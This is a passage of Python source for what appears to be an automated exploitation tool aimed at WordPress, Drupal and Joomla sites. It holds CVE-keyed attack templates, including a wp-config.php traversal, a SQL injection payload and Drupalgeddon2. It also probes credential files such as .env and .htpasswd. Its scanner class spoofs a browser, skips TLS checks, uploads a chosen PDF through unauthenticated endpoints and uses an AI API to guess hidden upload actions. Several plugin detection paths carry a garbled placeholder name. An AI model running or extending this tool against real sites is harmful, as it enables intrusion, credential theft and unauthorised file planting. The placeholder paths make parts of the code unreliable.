                "detect": "/wp-content/plugins/post-smtp/readme.txt",
                "vulns": [{
                    "id": "CVE-2024-0660", "name": "Post SMTP Auth Bypass",
                    "affected": "<=2.8.7",
                    "method": "GET",
                    "path": "/wp-json/post-smtp/v1/connect-app",
                    "body_type": "none",
                    "success_status": [200],
                    "success_body": ["token", "success"],
                    "success_detail": "auth bypass endpoint accessible",
                }],
            },
            # ── Backup plugins ───────────────────────────────────
            "backupbuddy": {
                "detect": "/wp-content/plugins/developer-flavor-flavor-flavor/readme.txt",
                "vulns": [{
                    "id": "CVE-2022-31474", "name": "BackupBuddy Directory Traversal",
                    "affected": "<=8.7.4.1",
                    "method": "GET",
                    "path": "/wp-admin/admin-ajax.php?action=pb_backupbuddy_download&backupbuddy_backup=../../../../wp-config.php",
                    "body_type": "none",
                    "success_status": [200],
                    "success_body": ["DB_PASSWORD", "DB_NAME"],
                    "success_detail": "directory traversal confirmed",
                }],
            },
            "updraftplus": {
                "detect": "/wp-content/plugins/updraftplus/readme.txt",
                "vulns": [{
                    "id": "CVE-2022-0633", "name": "UpdraftPlus Backup Download",
                    "affected": "<=1.22.2",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php",
                    "body_type": "upload", "upload_field": "file",
                    "extra_fields": {
                        "action": "updraft_download_backup",
                        "type": "db",
                        "timestamp": "0",
                    },
                    "success_status": [200],
                    "success_body": ["success", "download"],
                    "success_detail": "backup download accessible",
                }],
            },
            # ── SQL Injection plugins ────────────────────────────
            "wp-automatic": {
                "detect": "/wp-content/plugins/developer-flavor-flavor-flavor/readme.txt",
                "vulns": [{
                    "id": "CVE-2024-27956", "name": "WP Automatic SQLi",
                    "affected": "<=3.92.0",
                    "method": "POST",
                    "path": "/wp-content/plugins/wp-automatic/inc/csv.php",
                    "body_type": "raw",
                    "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                    "success_status": [200],
                    "success_body": ["error", "sql", "query"],
                    "success_detail": "SQL injection endpoint accessible",
                }],
            },
            # ── Editor plugins ───────────────────────────────────
            "ckeditor-for-wordpress": {
                "detect": "/wp-content/plugins/developer-flavor-flavor-flavor/readme.txt",
                "vulns": [{
                    "id": "ckfinder-upload", "name": "CKFinder Upload",
                    "method": "POST",
                    "path": "/wp-content/plugins/ckeditor-for-wordpress/ckeditor/ckfinder/core/connector/php/connector.php?command=FileUpload&type=Files&currentFolder=/",
                    "body_type": "upload", "upload_field": "upload",
                    "success_status": [200],
                    "success_body": ["uploaded", "fileName"],
                    "success_detail": "CKFinder upload accepted",
                }],
            },
            # ── Kaswara (WPBakery addon) ─────────────────────────
            "kaswara": {
                "detect": "/wp-content/plugins/developer-flavor-flavor-flavor/readme.txt",
                "vulns": [{
                    "id": "CVE-2021-24284", "name": "Kaswara Modern WPBakery Upload",
                    "affected": "<=3.0.1",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=uploadFontIcon",
                    "body_type": "upload", "upload_field": "file",
                    "success_status": [200],
                    "success_body": ["success", "uploaded", "url"],
                    "success_detail": "unauthenticated upload accepted",
                }],
            },
            # ── Events Manager (actively exploited) ───────────────
            "events-manager": {
                "detect": "/wp-content/plugins/events-manager/readme.txt",
                "vulns": [{
                    "id": "em-upload", "name": "Events Manager Upload",
                    "method": "POST",
                    "path": "/wp-admin/admin-ajax.php?action=em_upload",
                    "body_type": "upload", "upload_field": "file",
                    "success_status": [200],
                    "success_body": ["success", "url", "uploaded"],
                    "success_detail": "Events Manager upload accepted",
                }],
            },
        },
    },

    # ╔═══════════════════════════════════════════════════════════════╗
    # ║  DRUPAL                                                       ║
    # ╚═══════════════════════════════════════════════════════════════╝
    "drupal": {
        "core": [
            {
                "id": "drupal-jsonapi", "name": "Drupal JSON:API File Upload",
                "method": "POST", "path": "/jsonapi/file/file",
                "body_type": "json",
                "headers": {
                    "Content-Type": "application/vnd.api+json",
                    "Accept": "application/vnd.api+json",
                },
                "success_status": [201],
                "success_detail": "201 Created via JSON:API",
            },
            {
                "id": "drupal-jsonapi-bypass", "name": "Drupal JSON:API Bypass (CVE-2020-13665)",
                "method": "POST", "path": "/jsonapi/file/file",
                "body_type": "raw",
                "headers": {
                    "Content-Type": "application/octet-stream",
                    "Content-Disposition": 'file; filename="{filename}"',
                    "Accept": "application/vnd.api+json",
                },
                "success_status": [200, 201],
                "success_detail": "read-only bypass accepted upload",
            },
            {
                "id": "drupal-rest-file", "name": "Drupal REST File Upload",
                "method": "POST",
                "paths": ["/file/upload", "/entity/file"],
                "body_type": "raw",
                "headers": {
                    "Content-Type": "application/octet-stream",
                    "Content-Disposition": 'file; filename="{filename}"',
                },
                "success_status": [200, 201],
                "success_detail": "REST file upload accepted",
            },
            {
                "id": "CVE-2018-7600", "name": "Drupalgeddon2 RCE",
                "method": "POST", "path": "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax",
                "body_type": "raw",
                "headers": {"Content-Type": "application/x-www-form-urlencoded"},
                "success_status": [200],
                "success_body": ["command", "ajax"],
                "success_detail": "Drupalgeddon2 render array accepted",
            },
            {
                "id": "CVE-2019-6340", "name": "Drupal REST RCE",
                "method": "POST",
                "paths": [
                    "/node?_format=hal_json",
                    "/node/1?_format=hal_json",
                ],
                "body_type": "json",
                "headers": {
                    "Content-Type": "application/hal+json",
                },
                "success_status": [200, 201],
                "success_body": ["nid", "uuid"],
                "success_detail": "REST deserialization endpoint accessible",
            },
        ],
        "plugins": {
            "webform": {
                "detect": "/modules/webform/webform.info.yml",
                "vulns": [{
                    "id": "drupal-webform", "name": "Drupal Webform Upload",
                    "method": "POST", "path": "/webform/ajax/upload",
                    "body_type": "upload", "upload_field": "files[upload]",
                    "success_status": [200],
                    "success_body": ["fid", '"file"'],
                    "success_detail": "AJAX upload accepted",
                }],
            },
            "imce": {
                "detect": "/modules/imce/imce.info.yml",
                "vulns": [{
                    "id": "drupal-imce", "name": "Drupal IMCE Upload (CVE-2019-8943)",
                    "method": "POST", "path": "/imce",
                    "body_type": "upload", "upload_field": "files[imce]",
                    "extra_fields": {"op": "Upload", "form_id": "imce"},
                    "success_status": [200],
                    "success_body": ["uploaded", "success"],
                    "success_detail": "IMCE upload accepted",
                }],
            },
            "ckeditor": {
                "detect": "/modules/ckeditor/ckeditor.info.yml",
                "vulns": [{
                    "id": "drupal-ckeditor-upload", "name": "Drupal CKEditor Upload",
                    "method": "POST",
                    "path": "/ckeditor/upload/image?format=json",
                    "body_type": "upload", "upload_field": "upload",
                    "success_status": [200],
                    "success_body": ["url", "uploaded"],
                    "success_detail": "CKEditor upload accepted",
                }],
            },
            "views": {
                "detect": "/modules/views/views.info.yml",
                "vulns": [{
                    "id": "drupal-views-info", "name": "Drupal Views Info Disclosure",
                    "method": "GET",
                    "path": "/admin/structure/views",
                    "body_type": "none",
                    "success_status": [200],
                    "success_body": ["view-content", "views-field"],
                    "success_detail": "Views admin page accessible without auth",
                }],
            },
        },
    },

    # ╔═══════════════════════════════════════════════════════════════╗
    # ║  JOOMLA                                                       ║
    # ╚═══════════════════════════════════════════════════════════════╝
    "joomla": {
        "core": [
            {
                "id": "joomla-com-media", "name": "Joomla com_media Upload",
                "method": "POST",
                "path": "/index.php?option=com_media&task=file.upload",
                "body_type": "upload", "upload_field": "Filedata",
                "extra_fields": {"folder": "", "format": "json"},
                "success_status": [200],
                "success_body": ["success", '"status":true'],
                "success_detail": "file upload accepted",
            },
            {
                "id": "CVE-2023-23752", "name": "Joomla API Info Disclosure",
                "method": "GET",
                "path": "/api/index.php/v1/config/application?public=true",
                "body_type": "none",
                "success_status": [200],
                "success_body": ["password", "dbtype", "host"],
                "success_detail": "API config exposed (credentials leak)",
            },
            {
                "id": "joomla-media-api", "name": "Joomla Media API Upload",
                "method": "POST",
                "path": "/api/index.php/v1/media",
                "body_type": "raw",
                "headers": {
                    "Content-Type": "application/pdf",
                    "Content-Disposition": 'attachment; filename="{filename}"',
                },
                "success_status": [200, 201],
                "success_body": ["url", "path"],
                "success_detail": "media API upload accepted",
            },
        ],
        "plugins": {
            "com_jce": {
                "detect": "/administrator/components/com_jce/jce.xml",
                "vulns": [{
                    "id": "jce-upload", "name": "JCE Editor Upload",
                    "method": "POST",
                    "path": "/index.php?option=com_jce&task=plugin.display&plugin=image&file=imgmanager",
                    "body_type": "upload", "upload_field": "file",
                    "extra_fields": {"upload-dir": "/images/", "upload-overwrite": "0", "action": "upload"},
                    "success_status": [200],
                    "success_body": ["result", "uploaded"],
                    "success_detail": "JCE ImageManager accepted upload",
                }],
            },
            "com_fabrik": {
                "detect": "/administrator/components/com_fabrik/fabrik.xml",
                "vulns": [{
                    "id": "CVE-2018-7299", "name": "Fabrik File Upload",
                    "method": "POST",
                    "path": "/index.php?option=com_fabrik&format=raw&task=plugin.pluginAjax&g=element&plugin=fileupload&method=ajax_upload",
                    "body_type": "upload", "upload_field": "file",
                    "success_status": [200],
                    "success_body": ["success", "url", "path"],
                    "success_detail": "Fabrik upload accepted",
                }],
            },
            "com_akeeba": {
                "detect": "/administrator/components/com_akeeba/akeeba.xml",
                "vulns": [{
                    "id": "akeeba-backup-dl", "name": "Akeeba Backup Download",
                    "method": "GET",
                    "path": "/administrator/components/com_akeeba/backup/",
                    "body_type": "none",
                    "success_status": [200],
                    "success_body": ["jpa", "backup", "sql"],
                    "success_detail": "backup directory listing accessible",
                }],
            },
            "com_jdownloads": {
                "detect": "/administrator/components/com_jdownloads/jdownloads.xml",
                "vulns": [{
                    "id": "jdownloads-upload", "name": "JDownloads Upload",
                    "method": "POST",
                    "path": "/index.php?option=com_jdownloads&task=upload.upload",
                    "body_type": "upload", "upload_field": "file_upload",
                    "success_status": [200],
                    "success_body": ["success", "uploaded"],
                    "success_detail": "JDownloads upload accepted",
                }],
            },
            "com_fields": {
                "detect": "/administrator/components/com_fields/fields.xml",
                "vulns": [{
                    "id": "CVE-2017-8917", "name": "Joomla Fields SQLi",
                    "method": "GET",
                    "path": "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(1,concat(0x7e,version()),1)",
                    "body_type": "none",
                    "success_status": [200, 500],
                    "success_body": ["XPATH", "mysql", "MariaDB"],
                    "success_detail": "SQL injection confirmed",
                }],
            },
        },
    },

    # ╔═══════════════════════════════════════════════════════════════╗
    # ║  GENERIC (always run)                                         ║
    # ╚═══════════════════════════════════════════════════════════════╝
    "generic": [
        {
            "id": "http-put", "name": "HTTP PUT Upload",
            "method": "PUT",
            "paths": [
                "/uploads/{filename}", "/wp-content/uploads/{filename}",
                "/sites/default/files/{filename}", "/images/{filename}",
                "/media/{filename}",
            ],
            "body_type": "raw",
            "headers": {"Content-Type": "application/pdf"},
            "success_status": [200, 201, 204],
            "success_detail": "PUT upload accepted",
            "verify_upload": True,
        },
        {
            "id": "webdav", "name": "WebDAV PROPFIND",
            "method": "PROPFIND",
            "path": "/",
            "body_type": "none",
            "headers": {"Depth": "0"},
            "success_status": [207],
            "success_detail": "WebDAV enabled",
        },
        {
            "id": "options-put", "name": "OPTIONS PUT Allowed",
            "method": "OPTIONS",
            "paths": [
                "/uploads/", "/wp-content/uploads/",
                "/sites/default/files/", "/images/", "/media/",
            ],
            "body_type": "none",
            "success_status": [200, 204],
            "success_detail": "PUT in Allow header",
            "check_allow_put": True,
        },
        {
            "id": "direct-post", "name": "Direct POST Upload",
            "method": "POST",
            "paths": ["/upload.php", "/uploader.php", "/file-upload", "/api/upload",
                      "/fileupload", "/ajaxupload"],
            "body_type": "upload", "upload_field": "file",
            "success_status": [200],
            "success_body": ["success", "uploaded", '"url"'],
            "success_detail": "open upload endpoint found",
        },
        {
            "id": "elfinder-open", "name": "elFinder Open Connector",
            "method": "GET",
            "paths": [
                "/elfinder/connector.php?cmd=open&target=l1_Lw&init=1&tree=1",
                "/admin/elfinder/connector.php?cmd=open&target=l1_Lw&init=1&tree=1",
            ],
            "body_type": "none",
            "success_status": [200],
            "success_body": ['"cwd"', '"files"'],
            "success_detail": "elFinder connector exposed",
        },
        {
            "id": "fckeditor-open", "name": "FCKEditor File Browser",
            "method": "GET",
            "paths": [
                "/fckeditor/editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/",
                "/FCKeditor/editor/filemanager/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=File&CurrentFolder=/",
            ],
            "body_type": "none",
            "success_status": [200],
            "success_body": ["Connector", "CurrentFolder", "Files"],
            "success_detail": "FCKEditor file browser exposed",
        },
        {
            "id": "ckfinder-open", "name": "CKFinder Connector",
            "method": "GET",
            "paths": [
                "/ckfinder/core/connector/php/connector.php?command=Init",
                "/ckfinder/connector.php?command=Init",
            ],
            "body_type": "none",
            "success_status": [200],
            "success_body": ["resourceTypes", "connector"],
            "success_detail": "CKFinder connector exposed",
        },
        {
            "id": "php-filemanager", "name": "PHP File Manager Scripts",
            "method": "GET",
            "paths": [
                "/filemanager.php", "/fm.php", "/files.php",
                "/admin/filemanager.php", "/admin/fm.php",
            ],
            "body_type": "none",
            "success_status": [200],
            "success_body": ["filemanager", "file manager", "upload"],
            "success_detail": "PHP file manager script found",
        },
    ],
}

# ── Exposure Check Paths ────────────────────────────────────────────────────

EXPOSURE_CHECKS = [
    ("/wp-content/debug.log", "WP Debug Log Exposed", ["PHP", "error", "Warning", "Fatal", "Stack trace"]),
    ("/.env", "Environment File Exposed", ["DB_PASSWORD", "APP_KEY", "SECRET", "DATABASE_URL"]),
    ("/.git/config", "Git Config Exposed", ["[core]", "[remote", "repositoryformatversion"]),
    ("/wp-config.php.bak", "WP Config Backup", ["DB_PASSWORD", "DB_NAME"]),
    ("/wp-config.php.old", "WP Config Old Backup", ["DB_PASSWORD", "DB_NAME"]),
    ("/wp-config.php~", "WP Config Tilde Backup", ["DB_PASSWORD", "DB_NAME"]),
    ("/wp-config.php.save", "WP Config Save Backup", ["DB_PASSWORD", "DB_NAME"]),
    ("/wp-content/uploads/", "Upload Dir Listing", ["Index of", "Parent Directory", "<pre>"]),
    ("/server-status", "Apache Server Status", ["Server Version", "Total Accesses", "Apache"]),
    ("/server-info", "Apache Server Info", ["Server Version", "Module Name", "Apache"]),
    ("/phpinfo.php", "PHP Info Exposed", ["phpinfo()", "PHP Version", "php.ini"]),
    ("/info.php", "PHP Info Alt Exposed", ["phpinfo()", "PHP Version"]),
    ("/adminer.php", "Adminer Exposed", ["adminer", "Login", "database"]),
    ("/.htpasswd", "htpasswd File Exposed", ["$apr1$", ":"]),
    ("/.htaccess", "htaccess File Exposed", ["RewriteEngine", "RewriteRule", "Options"]),
    ("/web.config", "IIS Web.config Exposed", ["configuration", "system.web"]),
    ("/backup.sql", "SQL Backup Exposed", ["CREATE TABLE", "INSERT INTO"]),
    ("/db.sql", "DB Backup Exposed", ["CREATE TABLE", "INSERT INTO"]),
    ("/database.sql", "Database Backup", ["CREATE TABLE", "INSERT INTO"]),
    ("/.DS_Store", "DS_Store Exposed", ["\x00\x00\x00\x01Bud1"]),
]


# ── VulnScanner ──────────────────────────────────────────────────────────────

class VulnScanner:
    """Tests a target site for known upload vulnerabilities (data-driven)."""

    def __init__(self, target_url, pdf_bytes, pdf_filename, check_timeout=10, delay=0.5,
                 ai_key='', oai_key='', ai_model=''):
        self.target = target_url.rstrip('/')
        self.pdf_bytes = pdf_bytes
        self.pdf_filename = pdf_filename
        self.check_timeout = check_timeout
        self.delay = delay
        self.cms = None
        self.results = []
        self._lock = threading.Lock()
        self._ai_key = ai_key
        self._oai_key = oai_key
        self._ai_model = ai_model
        self.ai_used = False
        self._debug_log = []

    # ── HTTP helpers (unchanged) ─────────────────────────────────

    def _request(self, method, url, headers=None, body=None):
        """urllib wrapper. Returns (status, headers_dict, body_bytes)."""
        try:
            h = dict(headers or {})
            if 'User-Agent' not in h:
                h['User-Agent'] = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                                   'AppleWebKit/537.36 (KHTML, like Gecko) '
                                   'Chrome/120.0.0.0 Safari/537.36')
            req = urllib.request.Request(url, data=body, method=method, headers=h)
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            try:
                resp = urllib.request.urlopen(req, timeout=self.check_timeout, context=ctx)
                return resp.getcode(), dict(resp.headers), resp.read(2 * 1024 * 1024)
            except urllib.error.HTTPError as e:
                body_bytes = b''
                try:
                    body_bytes = e.read(2 * 1024 * 1024)
                except Exception:
                    pass
                return e.code, dict(e.headers) if e.headers else {}, body_bytes
        except Exception as e:
            return 0, {}, str(e).encode()

    def _multipart_body(self, field_name, filename, content_type, file_bytes, extra_fields=None):
        """Build multipart/form-data. Returns (body_bytes, content_type_header)."""
        boundary = 'BubbleGumBoundary' + uuid.uuid4().hex[:12]
        body = b''
        if extra_fields:
            for k, v in extra_fields.items():
                body += f'--{boundary}\r\n'.encode()
                body += f'Content-Disposition: form-data; name="{k}"\r\n\r\n{v}\r\n'.encode()
        body += f'--{boundary}\r\n'.encode()
        body += f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'.encode()
        body += f'Content-Type: {content_type}\r\n\r\n'.encode()
        body += file_bytes + b'\r\n'
        body += f'--{boundary}--\r\n'.encode()
        return body, f'multipart/form-data; boundary={boundary}'

    def _verify_upload(self, expected_url):
        """GET the URL (follows redirects), check for PDF content."""
        if not expected_url:
            return False
        try:
            req = urllib.request.Request(expected_url, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            resp = urllib.request.urlopen(req, timeout=self.check_timeout, context=ctx)
            if resp.getcode() != 200:
                return False
            ct = resp.headers.get('Content-Type', '')
            body = resp.read(1024)
            return 'application/pdf' in ct or body[:5] == b'%PDF-'
        except Exception:
            return False

    def _add(self, vector, name, status, detail, upload_url=None):
        with self._lock:
            self.results.append({
                "vector": vector, "name": name, "status": status,
                "detail": detail, "upload_url": upload_url
            })

    def _dbg(self, msg):
        print(f"[VULNSCAN] {msg}", flush=True)
        self._debug_log.append(msg)

    # ── CMS Detection (unchanged) ───────────────────────────────

    def detect_cms(self):
        self._site_reachable = False

        status, _, body = self._request('GET', self.target + '/')
        if status:
            self._site_reachable = True
        if status and body:
            html = body.decode('utf-8', errors='replace')
            m = re.search(r'<meta[^>]*name=["\']generator["\'][^>]*content=["\']([^"\']*)["\']', html, re.I)
            if not m:
                m = re.search(r'<meta[^>]*content=["\']([^"\']*)["\'][^>]*name=["\']generator["\']', html, re.I)
            if m:
                gen = m.group(1).lower()
                if 'wordpress' in gen: self.cms = 'wordpress'; return
                elif 'drupal' in gen: self.cms = 'drupal'; return
                elif 'joomla' in gen: self.cms = 'joomla'; return

        s, _, b = self._request('GET', self.target + '/wp-json/')
        if s:
            self._site_reachable = True
        if s == 200 and b:
            try:
                json.loads(b)
                self.cms = 'wordpress'; return
            except Exception:
                pass

        s, _, _ = self._request('GET', self.target + '/wp-login.php')
        if s:
            self._site_reachable = True
        if s in (200, 302): self.cms = 'wordpress'; return

        s, _, b = self._request('GET', self.target + '/CHANGELOG.txt')
        if s:
            self._site_reachable = True
        if s == 200 and b and b'Drupal' in b: self.cms = 'drupal'; return

        s, _, _ = self._request('GET', self.target + '/administrator/')
        if s:
            self._site_reachable = True
        if s == 200: self.cms = 'joomla'; return

    # ── Version helpers ──────────────────────────────────────────

    def _parse_version(self, ver_str):
        """Parse '1.2.3' → (1, 2, 3). Returns None on failure."""
        try:
            return tuple(int(x) for x in ver_str.strip().split('.'))
        except (ValueError, AttributeError):
            return None

    def _version_affected(self, installed, spec):
        """Check if installed version falls in affected range.
        Specs: '<=6.8', '<5.4.2', '6.0-6.8', '*'."""
        if not spec or spec == '*':
            return True
        inst = self._parse_version(installed)
        if inst is None:
            return True  # can't parse → assume affected

        if spec.startswith('<='):
            limit = self._parse_version(spec[2:])
            return limit is not None and inst <= limit
        if spec.startswith('<'):
            limit = self._parse_version(spec[1:])
            return limit is not None and inst < limit
        if '-' in spec:
            parts = spec.split('-', 1)
            lo = self._parse_version(parts[0])
            hi = self._parse_version(parts[1])
            if lo and hi:
                return lo <= inst <= hi
        return True

    # ── Plugin Enumeration ───────────────────────────────────────

    def _enumerate_plugins(self):
        """Probe for installed plugins via readme.txt / info files.
        Returns dict: {slug: version_string}."""
        cms_db = VULN_DB.get(self.cms or 'wordpress', {})
        plugins_db = cms_db.get('plugins', {})
        installed = {}

        def probe(slug, info):
            detect_path = info.get('detect', '')
            if not detect_path:
                return
            url = self.target + detect_path
            status, _, body = self._request('GET', url)
            if status != 200 or not body:
                return
            text = body.decode('utf-8', errors='replace')
            # WordPress: parse "Stable tag: X.Y.Z"
            m = re.search(r'Stable tag:\s*([0-9][0-9.]*)', text, re.I)
            if m:
                installed[slug] = m.group(1)
                return
            # Drupal: parse "version: 'X.Y.Z'" from .info.yml
            m = re.search(r"version:\s*['\"]?([0-9][0-9.]*)", text, re.I)
            if m:
                installed[slug] = m.group(1)
                return
            # Joomla: parse <version>X.Y.Z</version> from XML
            m = re.search(r'<version>([0-9][0-9.]*)</version>', text, re.I)
            if m:
                installed[slug] = m.group(1)
                return
            # Found the file but couldn't parse version
            installed[slug] = 'unknown'

        with ThreadPoolExecutor(max_workers=10) as pool:
            futures = {pool.submit(probe, slug, info): slug
                       for slug, info in plugins_db.items()}
            for f in as_completed(futures):
                try:
                    f.result()
                except Exception:
                    pass

        return installed

    # ── Dynamic Plugin Discovery ────────────────────────────────

    def _discover_plugins(self):
        """Discover installed plugins by scraping HTML + dir listing + REST API."""
        discovered = set()

        # Method 1: Parse homepage HTML for plugin references
        status, _, body = self._request('GET', self.target + '/')
        if status == 200 and body:
            html = body.decode('utf-8', errors='replace')
            for m in re.finditer(r'/wp-content/plugins/([a-zA-Z0-9_-]+)/', html):
                discovered.add(m.group(1))

        # Method 2: Directory listing on /wp-content/plugins/
        status, _, body = self._request('GET', self.target + '/wp-content/plugins/')
        if status == 200 and body:
            html = body.decode('utf-8', errors='replace')
            if 'Index of' in html or 'Parent Directory' in html:
                self._add('exposure-plugin-listing', 'Plugin Directory Listing',
                          'vulnerable', 'directory listing enabled on /wp-content/plugins/')
                for m in re.finditer(r'href="([a-zA-Z0-9_-]+)/"', html):
                    discovered.add(m.group(1))

        # Method 3: REST API plugin list
        status, _, body = self._request('GET', self.target + '/wp-json/wp/v2/plugins')
        if status == 200 and body:
            try:
                plugins = json.loads(body)
                if isinstance(plugins, list):
                    for p in plugins:
                        slug = p.get('textdomain', '') or p.get('plugin', '').split('/')[0]
                        if slug:
                            discovered.add(slug)
            except Exception:
                pass

        return discovered

    # ── AI Helpers ──────────────────────────────────────────────

    @property
    def _has_ai(self):
        """True when a usable AI key + model are configured."""
        if self._ai_model.startswith(('gpt-', 'o1', 'o3', 'o4')):
            return bool(self._oai_key)
        return bool(self._ai_key)

    def _call_ai(self, prompt, max_tokens=512):
        """Call Anthropic or OpenAI via stdlib. Returns '' on any error."""
        try:
            is_openai = self._ai_model.startswith(('gpt-', 'o1', 'o3', 'o4'))
            if is_openai:
                url = 'https://api.openai.com/v1/chat/completions'
                payload = json.dumps({
                    'model': self._ai_model,
                    'messages': [{'role': 'user', 'content': prompt}],
                    'max_tokens': max_tokens,
                    'temperature': 0
                }).encode()
                headers = {
                    'Content-Type': 'application/json',
                    'Authorization': f'Bearer {self._oai_key}'
                }
            else:
                url = 'https://api.anthropic.com/v1/messages'
                payload = json.dumps({
                    'model': self._ai_model or 'claude-sonnet-4-20250514',
                    'max_tokens': max_tokens,
                    'messages': [{'role': 'user', 'content': prompt}]
                }).encode()
                headers = {
                    'Content-Type': 'application/json',
                    'x-api-key': self._ai_key,
                    'anthropic-version': '2023-06-01'
                }

            req = urllib.request.Request(url, data=payload, headers=headers, method='POST')
            ctx = ssl.create_default_context()
            resp = urllib.request.urlopen(req, timeout=30, context=ctx)
            data = json.loads(resp.read().decode())

            if is_openai:
                return data.get('choices', [{}])[0].get('message', {}).get('content', '')
            else:
                blocks = data.get('content', [])
                return blocks[0].get('text', '') if blocks else ''
        except Exception:
            return ''

    def _ai_generate_actions(self, slug):
        """Ask AI for likely upload action names for a WordPress plugin."""
        prompt = (
            f"For the WordPress plugin '{slug}', list the most likely admin-ajax.php "
            f"action names that handle file uploads. Consider wp_ajax_ and wp_ajax_nopriv_ "
            f"hooks. Return ONLY a JSON array of action name strings, nothing else. "
            f"Example: [\"em_upload\", \"em_image_upload\"]"
        )
        raw = self._call_ai(prompt, max_tokens=256)
        if not raw:
            return []
        # Extract JSON array from response
        m = re.search(r'\[.*?\]', raw, re.DOTALL)
        if not m:
            return []
        try:
            actions = json.loads(m.group(0))
        except (json.JSONDecodeError, ValueError):
            return []
        # Sanitize: only allow safe action names, cap at 15
        safe = re.compile(r'^[a-zA-Z0-9_-]+$')
        return [a for a in actions if isinstance(a, str) and safe.match(a)][:15]

    def _ai_analyze_response(self, action, status, text):
        """Ask AI whether an HTTP response indicates a successful file upload."""
        snippet = text[:2000]
        prompt = (
            f"An HTTP POST to WordPress admin-ajax.php?action={action} returned "
            f"status {status} with this body:\n\n{snippet}\n\n"
            f"Does this response indicate a successful file upload? "
            f"Reply with ONLY a JSON object: "
            f'{{\"uploaded\": true/false, \"confidence\": \"high\"/\"medium\"/\"low\", '
            f'\"evidence\": \"brief reason\"}}'
        )
        raw = self._call_ai(prompt, max_tokens=128)
        if not raw:
            return None
        m = re.search(r'\{.*?\}', raw, re.DOTALL)
        if not m:
            return None
        try:
            result = json.loads(m.group(0))
            if isinstance(result.get('uploaded'), bool):
                return result
        except (json.JSONDecodeError, ValueError):
            pass
        return None

    # ── Generic Upload Probing ──────────────────────────────────

    def _probe_generic_upload(self, slug):
        """Try common upload action patterns for a plugin not in VULN_DB."""
        slug_under = slug.replace('-', '_')

        # AI-generated actions or fallback to hardcoded patterns
        if self._has_ai:
            ai_actions = self._ai_generate_actions(slug)
            if ai_actions:
                self.ai_used = True
                actions = ai_actions
            else:
                actions = [
                    f"{slug_under}_upload", f"{slug_under}_file_upload",
                    f"{slug_under}_upload_file", f"upload_{slug_under}",
                    f"{slug_under}_ajax_upload", f"{slug_under}_import",
                ]
        else:
            actions = [
                f"{slug_under}_upload", f"{slug_under}_file_upload",
                f"{slug_under}_upload_file", f"upload_{slug_under}",
                f"{slug_under}_ajax_upload", f"{slug_under}_import",
            ]

        for action in actions:
            url = f"{self.target}/wp-admin/admin-ajax.php?action={action}"
            for field in ('file', 'upload', 'Filedata'):
                body, ct = self._multipart_body(field, self.pdf_filename,
                                                'application/pdf', self.pdf_bytes)
                status, _, resp = self._request('POST', url, {'Content-Type': ct}, body)
                if status == 0:
                    continue
                text = resp.decode('utf-8', errors='replace')
                # Skip generic WP "unknown action" responses
                if status == 200 and text.strip() not in ('0', '-1', ''):
                    # Fast path: clear keyword match
                    if any(s in text.lower() for s in ('success', 'url', 'uploaded', 'file_url', '"path"')):
                        self._add(f'generic-{slug}', f'{slug} Upload (discovered)',
                                  'vulnerable', f'action={action} accepted upload')
                        return
                    # Smart path: AI analysis for ambiguous responses
                    if self._has_ai:
                        analysis = self._ai_analyze_response(action, status, text)
                        if analysis and analysis.get('uploaded'):
                            self.ai_used = True
                            confidence = analysis.get('confidence', '?')
                            evidence = analysis.get('evidence', '')
                            self._add(f'generic-{slug}', f'{slug} Upload (AI detected)',
                                      'vulnerable',
                                      f'action={action} [{confidence}] {evidence}')
                            return
        # Don't add "safe" results for generic probes (too noisy)

    # ── Upload Directory Checks ─────────────────────────────────

    def _check_upload_dirs(self):
        """Check for plugin-created upload subdirectories and directory listing."""
        upload_dirs = [
            ("/wp-content/uploads/", "Upload Root"),
            ("/wp-content/uploads/event-manager-uploads/", "Events Manager Uploads"),
            ("/wp-content/uploads/gravity_forms/", "Gravity Forms Uploads"),
            ("/wp-content/uploads/formidable/", "Formidable Uploads"),
            ("/wp-content/uploads/ninja-forms/", "Ninja Forms Uploads"),
            ("/wp-content/uploads/wpforms/", "WPForms Uploads"),
            ("/wp-content/uploads/woocommerce_uploads/", "WooCommerce Uploads"),
        ]

        def check_dir(path, name):
            url = self.target + path
            status, _, body = self._request('GET', url)
            if status == 200 and body:
                text = body.decode('utf-8', errors='replace')[:8192]
                if 'Index of' in text or 'Parent Directory' in text:
                    self._add(f'exposure-{name.lower().replace(" ", "-")}',
                              f'{name} Dir Listing', 'vulnerable',
                              f'directory listing enabled at {path}')

        with ThreadPoolExecutor(max_workers=8) as pool:
            futures = [pool.submit(check_dir, path, name) for path, name in upload_dirs]
            for f in as_completed(futures):
                try:
                    f.result()
                except Exception:
                    pass

    # ── Generic Exploit Runner ───────────────────────────────────

    def _run_exploit(self, vuln):
        """Execute a single exploit template and add result."""
        if self.delay > 0:
            time.sleep(self.delay)

        vid = vuln['id']
        vname = vuln['name']
        method = vuln.get('method', 'POST')
        body_type = vuln.get('body_type', 'upload')

        # Resolve paths
        if 'path_range' in vuln:
            start, end = vuln['path_range']
            paths = [vuln['path'].replace('{n}', str(i)) for i in range(start, end)]
        elif 'paths' in vuln:
            paths = list(vuln['paths'])
        else:
            paths = [vuln['path']]

        # Replace {filename} in paths
        paths = [p.replace('{filename}', self.pdf_filename) for p in paths]

        for path in paths:
            url = self.target + path

            # Build headers (replace {filename} placeholder)
            headers = {}
            for k, v in vuln.get('headers', {}).items():
                headers[k] = v.replace('{filename}', self.pdf_filename)

            # Build body
            body = None
            if body_type == 'upload':
                field = vuln.get('upload_field', 'file')
                ct = vuln.get('content_type', 'application/pdf')
                extra = vuln.get('extra_fields')
                body, content_type = self._multipart_body(field, self.pdf_filename, ct, self.pdf_bytes, extra)
                headers['Content-Type'] = content_type
